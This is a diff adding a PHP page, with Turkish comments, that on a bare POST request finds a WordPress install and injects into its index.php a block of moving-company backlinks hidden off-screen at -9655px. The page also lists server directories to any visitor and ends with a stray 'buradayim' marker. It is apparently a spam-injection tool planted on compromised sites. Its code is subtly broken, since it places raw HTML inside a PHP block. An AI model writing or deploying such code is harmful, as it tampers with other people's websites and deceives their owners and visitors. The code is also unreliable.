@@ -1,0 +1,102 @@
+<?php
+// Hata raporlamasını açalım
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// Fonksiyon: Dizin içeriğini listele
+function listDirectoryContents($dir) {
+    $contents = scandir($dir);
+    echo "Dizin içeriği ($dir):\n";
+    foreach ($contents as $item) {
+        echo "- $item\n";
+    }
+}
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -9655px;">
+<a href="https://www.kolaytasin.com.tr" title="profesyonel evden eve nakliyat">profesyonel evden eve nakliyat</a>
+<a href="https://www.ofis-tasimaciligi.com.tr" title="ofis taşımacılığı">ofis taşımacılığı</a>
+</span>' . PHP_EOL;
+
+    // Mevcut çalışma dizinini göster
+    echo "Mevcut çalışma dizini: " . getcwd() . "\n";
+
+    // WordPress ana dizinini bul
+    $currentDir = __DIR__;
+    $wpDir = $currentDir;
+    while (!file_exists($wpDir . '/wp-config.php') && $wpDir !== '/') {
+        $wpDir = dirname($wpDir);
+    }
+
+    if ($wpDir === '/') {
+        echo "WordPress ana dizini bulunamadı.\n";
+        listDirectoryContents($currentDir);
+        exit;
+    }
+
+    echo "WordPress ana dizini: $wpDir\n";
+    listDirectoryContents($wpDir);
+
+    // Ana dizindeki index.php dosyasının yolu
+    $indexFilePath = $wpDir . '/index.php';
+
+    echo "index.php dosya yolu: $indexFilePath\n";
+    echo "Dosya var mı?: " . (file_exists($indexFilePath) ? 'Evet' : 'Hayır') . "\n";
+    echo "Dosya okunabilir mi?: " . (is_readable($indexFilePath) ? 'Evet' : 'Hayır') . "\n";
+
+    // index.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($indexFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($indexFilePath);
+        
+        if ($fileContents === false) {
+            echo "Dosya okunamadı. Hata: " . error_get_last()['message'] . "\n";
+        } else {
+            // Backlink zaten var mı kontrol et
+            if (strpos($fileContents, $backlinkCode) === false) {
+                // PHP açılış etiketini bul
+                $phpOpenTag = '<?php';
+                $position = strpos($fileContents, $phpOpenTag);
+                
+                if ($position !== false) {
+                    // Yeni içerik: PHP açılış etiketi + backlink kodu + orijinal içerik
+                    $newContents = substr($fileContents, 0, $position + strlen($phpOpenTag)) . PHP_EOL . $backlinkCode . substr($fileContents, $position + strlen($phpOpenTag));
+                } else {
+                    // PHP açılış etiketi bulunamazsa, dosyanın en başına ekle
+                    $newContents = $backlinkCode . $fileContents;
+                }
+                
+                // Dosyayı yeni içerikle yaz
+                if (file_put_contents($indexFilePath, $newContents)) {
+                    echo "Backlink başarıyla eklendi: $indexFilePath\n";
+                } else {
+                    echo "Dosyaya yazma hatası: $indexFilePath\n";
+                    echo "Hata: " . error_get_last()['message'] . "\n";
+                }
+            } else {
+                echo "Backlink zaten mevcut: $indexFilePath\n";
+            }
+        }
+    } else {
+        echo "index.php dosyası bulunamadı: $indexFilePath\n";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WordPress index.php Backlink Ekleme (Hata Ayıklama)</title>
+</head>
+<body>
+    <h1>WordPress index.php Backlink Ekleme Aracı (Hata Ayıklama)</h1>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+    <pre><?php echo ob_get_clean(); ?></pre>
+</body>
+buradayim
+</html>
